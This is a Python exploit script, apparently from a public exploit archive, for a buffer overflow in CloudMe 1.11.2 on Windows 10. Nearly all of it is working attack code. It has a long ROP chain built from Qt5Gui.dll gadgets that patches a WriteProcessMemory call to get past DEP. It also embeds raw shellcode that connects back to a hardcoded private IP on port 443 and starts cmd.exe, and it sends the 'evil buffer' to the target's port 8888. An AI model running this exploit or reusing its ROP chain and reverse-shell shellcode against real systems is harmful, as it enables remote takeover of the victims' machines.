#!/usr/bin/python
# Exploit Author: Xavier Lim (TrickDKing)
# Vendor Homepage:https://www.cloudme.com/en
# Software: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Category: Local
# Tested on: Windows 10 Pro x64

import socket, sys
from struct import pack

try:
    server = sys.argv[1]
    port = 8888
    size = 2000

    # Read executable memory region is found at 0x0044b0e0 in q5gui but needs to be manually patched
    # Found qt5sql.dll has executable memory region at 0x6d9ed3f0, do not require patch
    wpm  = pack("<L", (0x46464646))  # Dummy WriteProcessMemory Address (Address of IAT entry containing WPM)
    wpm += pack("<L", (0x6d9ed3f0))  # Shellcode Return Address (Return address after executing WPM) 
    wpm += pack("<L", (0xFFFFFFFF))  # Pseudo Process handle (0xFFFFFFFF is set, it is -1 for the current process) Value of hProcess
    wpm += pack("<L", (0x6d9ed3f0))  # Code cave address (Shellcode RET Address) (Value of lpBaseAddress)
    wpm += pack("<L", (0x49494949))  # Dummy lpBuffer (Stack address) 
    wpm += pack("<L", (0x50505050))  # Dummy nSize 
    wpm += pack("<L", (0x51515151))  # lpNumberOfBytesWritten 

    # Bad characters: 0x00
    shellcode = b""
    shellcode += b"\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64"
    shellcode += b"\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e"
    shellcode += b"\x08\x66\x83\xc6\x04\x8b\x7e\x1c\x66\x83\xee"
    shellcode += b"\x04\x8b\x36\x66\x39\x4f\x18\x75\xea\xeb\x06"
    shellcode += b"\x5e\x89\x75\x04\xeb\x5f\xe8\xf5\xff\xff\xff"
    shellcode += b"\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b"
    shellcode += b"\x4f\x18\x66\x83\xc7\x04\x8b\x47\x1c\x66\x83"
    shellcode += b"\xef\x04\x01\xd8\x89\x45\xfc\xe3\x39\x66\x83"
    shellcode += b"\xe9\x01\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31"
    shellcode += b"\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d"
    shellcode += b"\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75\xdc\x8b"
    shellcode += b"\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c"
    shellcode += b"\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c"
    shellcode += b"\x61\xc3\x68\x83\xb9\xb5\x78\xff\x55\x04\x89"
    shellcode += b"\x45\x10\x68\x8e\x4e\x0e\xec\xff\x55\x04\x89"
    shellcode += b"\x45\x14\x68\x72\xfe\xb3\x16\xff\x55\x04\x89"
    shellcode += b"\x45\x18\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33"
    shellcode += b"\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\x55"
    shellcode += b"\x14\x89\xc3\x68\xcb\xed\xfc\x3b\xff\x55\x04"
    shellcode += b"\x89\x45\x1c\x68\xd9\x09\xf5\xad\xff\x55\x04"
    shellcode += b"\x89\x45\x24\x68\x0c\xba\x2d\xb3\xff\x55\x04"
    shellcode += b"\x89\x45\x28\x54\x58\x66\xb9\x90\x05\x29\xc8"
    shellcode += b"\x50\x31\xc0\x66\xb8\x02\x02\x50\xff\x55\x1c"
    shellcode += b"\x31\xc0\x50\x50\x50\xb0\x06\x50\x2c\x05\x50"
    shellcode += b"\x40\x50\xff\x55\x24\x89\xc6\x31\xc0\x50\x50"
    shellcode += b"\x68\xc0\xa8\x50\x80\x66\xb9\x01\xbb\xc1\xe1"
    shellcode += b"\x10\x66\x83\xc1\x02\x51\x54\x5f\x31\xc0\x50"
    shellcode += b"\x50\x50\x50\x04\x10\x50\x57\x56\xff\x55\x28"
    shellcode += b"\x56\x56\x56\x31\xc0\x50\x50\xb0\x80\x31\xc9"
    shellcode += b"\xb1\x80\x01\xc8\x50\x31\xc0\x50\x50\x50\x50"
    shellcode += b"\x50\x50\x50\x50\x50\x50\xb0\x44\x50\x54\x5f"
    shellcode += b"\xb8\x9b\x87\x9a\xff\xf7\xd8\x50\x68\x63\x6d"
    shellcode += b"\x64\x2e\x54\x5b\x54\x58\x31\xc9\x66\xb9\x90"
    shellcode += b"\x03\x29\xc8\x50\x57\x31\xc0\x50\x50\x50\x40"
    shellcode += b"\x50\x48\x50\x50\x53\x50\xff\x55\x18\x31\xc0"
    shellcode += b"\x50\x6a\xff\xff\x55\x10"
    shellcode += b"\x90" * 20 # NOPs to divide EIP and shellcode

    inputBuffer = b"\x90" * (1052 - len(wpm) - len(shellcode))
    # ROP gadgets are from Qt5Gui.dll
    # Command: rp-win-x86.exe -f Qt5Gui.dll -r 5 > rop.txt
    
    # Preserving the stack address
    eip = pack("<L", (0x61bd4a1e))   # push esp ; pop ebx ; pop esi ; ret ;
    rop = pack("<L", (0x90909090))   # Stack alignment for pop esi
    rop += pack("<L", (0x61b7eae4))  # mov eax, ebx ; pop ebx ; ret ;
    rop += pack("<L", (0x90909090))  # Stack alignment for pop ebx
    rop += pack("<L", (0x61e2b62d))  # pop ecx ; ret ;
    rop += pack("<L", (0xfffffbd8))  # -0n1056 to pop into ecx
    rop += pack("<L", (0x61b930c8))  # add eax, ecx ; ret ; # ROP skeleton is is in EAX
    # End of preserving the stack address

    # Start of patching WriteProcessMemory address
    rop += pack("<L", (0x61dcd14b))  # xchg eax, esi ; ret ; # ROP skeleton is in ESI
    rop += pack("<L", (0x61e2b62d))  # pop ecx ; ret ;
    rop += pack("<L", (0x6210b05c))  # IAT address for KERNEL32!GetCurrentProcess
    rop += pack("<L", (0x61eeecfe))  # mov eax,  [ecx] ; ret ; # IAT of KERNEL32!GetCurrentProcess in EAX
    rop += pack("<L", (0x61be5213))  # stc ; mov ecx, eax ; mov eax, ecx ; ret ; #  Make a copy of the IAT in ECX
    rop += pack("<L", (0x61ba88f1))  # pop eax ; ret ;
    rop += pack("<L", (0xfffebb10))  # Negative of 0x000144f0 or 0n83184
    rop += pack("<L", (0x61eed92a))  # neg eax ; ret ; # Hex value 0x144f0 in EAX
    rop += pack("<L", (0x61b930c8))  # add eax, ecx ; ret ; # IAT of KERNEL32!WriteProcessMemory in EAX
    rop += pack("<L", (0x61be5213))  # stc ; mov ecx, eax ; mov eax, ecx ; ret ; # Make a copy of the IAT to ECX
    rop += pack("<L", (0x61dcd14b))  # xchg eax, esi ; ret ; # ROP skeleton is in EAX
    rop += pack("<L", (0x61d7c0ff))  # mov  [eax+0x08], ecx ; retn 0x0008 ; ROP skeleton dummy WPM is overwritten
    rop += pack("<L", (0x61dcd14b))  # xchg eax, esi ; ret ; # ROP skeleton is in ESI
    rop += b"C" * 8                  # Stack alignment for retn 0x08
    # End of patching WriteProcessMemory address dummy value 0x46464646

    # Start of patching lpBuffer (Base pointer of the shellcode) Dummy value 0x49494949
    rop += pack("<L", (0x61ba88f1))  # pop eax ; ret ;
    rop += pack("<L", (0xfffffff0))  # Negative value of 0n16 or 0x10
    rop += pack("<L", (0x61eed92a))  # neg eax ; ret ; # 0n16 in EAX
    rop += pack("<L", (0x61be5213))  # stc ; mov ecx, eax ; mov eax, ecx ; ret ; # Make a copy of 0n16 in ECX
    rop += pack("<L", (0x61dcd14b))  # xchg eax, esi ; ret ; # ROP skeleton is in EAX
    rop += pack("<L", (0x61b930c8))  # add eax, ecx ; ret ;
    rop += pack("<L", (0x61be5213))  # stc ; mov ecx, eax ; mov eax, ecx ; ret ; # Copy of ROP skeleton to ECX
    rop += pack("<L", (0x61dcd14b))  # xchg eax, esi ; ret ; # ROP skeleton is in ESI
    rop += pack("<L", (0x61ba88f1))  # pop eax ; ret ;
    rop += pack("<L", (0xfffffe13))  # Negative value of 0n277 or 0x546
    rop += pack("<L", (0x61eed92a))  # neg eax ; ret ; # 0n1350 in EAX
    rop += pack("<L", (0x61b930c8))  # add eax, ecx ; ret ;
    rop += pack("<L", (0x61be5213))  # stc ; mov ecx, eax ; mov eax, ecx ; ret ; # stack address in ECX
    rop += pack("<L", (0x61dcd14b))  # xchg eax, esi ; ret ; # ROP skeleton is in EAX
    rop += pack("<L", (0x61d7c0ff))  # mov  [eax+0x08], ecx ; retn 0x0008 ; ROP skeleton dummy lpBuffer is overwritten
    rop += pack("<L", (0x61ecb2b5))  # inc eax ; ret ;
    rop += b"C" * 8                  # Stack alignment for retn 0x08
    # End of patching lpBuffer address dummy value 0x49494949

    # Start of patching nSize 0x50505050
    rop += pack("<L", (0x61ecb2b5))  # inc eax ; ret ;
    rop += pack("<L", (0x61ecb2b5))  # inc eax ; ret ;
    rop += pack("<L", (0x61ecb2b5))  # inc eax ; ret ;
    rop += pack("<L", (0x61dcd14b))  # xchg eax, esi ; ret ; # ROP skeleton is in ESI
    rop += pack("<L", (0x61ba88f1))  # pop eax ; ret ; # Negative value of 0n528 or 0x210
    rop += pack("<L", (0xfffffccc))  #  Negative value of 0n820
    rop += pack("<L", (0x61eed92a))  # neg eax ; ret ; # 0n820 in EAX
    rop += pack("<L", (0x61be5213))  # stc ; mov ecx, eax ; mov eax, ecx ; ret ; # 0n528 in ECX
    rop += pack("<L", (0x61dcd14b))  # xchg eax, esi ; ret ; # ROP skeleton is in EAX
    rop += pack("<L", (0x61d7c0ff))  # mov  [eax+0x08], ecx ; retn 0x0008 ; # ROP skeleton dummy nSize is overwritten
    rop += pack("<L", (0x61ecb2b5))  # inc eax ; ret ;
    rop += b"C" * 8                  # Stack alignment for retn 0x08
    # End of patching nSize 0x50505050

    # Start of patching lpNumberOfBytesWritten dummy value 0x51515151
    rop += pack("<L", (0x61ecb2b5))  # inc eax ; ret ;
    rop += pack("<L", (0x61ecb2b5))  # inc eax ; ret ;
    rop += pack("<L", (0x61ecb2b5))  # inc eax ; ret ;
    rop += pack("<L", (0x61dcd14b))  # xchg eax, esi ; ret ; # ROP skeleton is in ESI
    rop += pack("<L", (0x61ec26c0))  # xor eax, eax ; ret ;
    rop += pack("<L", (0x61be5213))  # stc ; mov ecx, eax ; mov eax, ecx ; ret ;
    rop += pack("<L", (0x61dcd14b))  # xchg eax, esi ; ret ; # ROP skeleton is in ESI
    rop += pack("<L", (0x61d7c0ff))  # mov  [eax+0x08], ecx ; retn 0x0008 ; # ROP skeleton dummy lpNumberOfBytesWritten is overwritten
    # End of patching lpNumberOfBytesWritten dummy value 0x51515151

    # Realignment back to start of ROP skeleton
    rop += pack("<L", (0x61e2b62d))  # pop ecx ; ret ;
    rop += b"C" * 8                  # Stack alignment for retn 0x08
    rop += pack("<L", (0xfffffff0))  # 
    rop += pack("<L", (0x61b930c8))  # add eax, ecx ; ret ;

    # Redirect execution flow to WPM function
    rop += pack("<L", (0x61d81114))  # xchg eax, esp ; ret ; 

    padding = b"\x90" * 20
    
    # WPM is offset 000144f0 away from GetCurrentProcess
    
    filler = b"\x90" * (size - len(wpm) - len(inputBuffer) - len(eip) - len(rop)- len(padding) - len(shellcode))

    payload = wpm
    payload += inputBuffer
    payload += shellcode
    payload += eip
    payload += rop
    payload += padding
    payload += filler

    print("WPM Skeleton Length", len(wpm))
    print("Shellcode length",len(shellcode))
    print("Input buffer length",len(inputBuffer))
    print("EIP gadget length",len(eip))
    print("ROP gadgets length",len(rop))
    print("Padding length",len(padding))
    print("Filler length",len(filler))
    print("Total payload size", len(payload))
    
    print("Sending evil buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(payload)
    s.close()
  
    print("Done!")
  
except socket.error:
    print("Could not connect!")
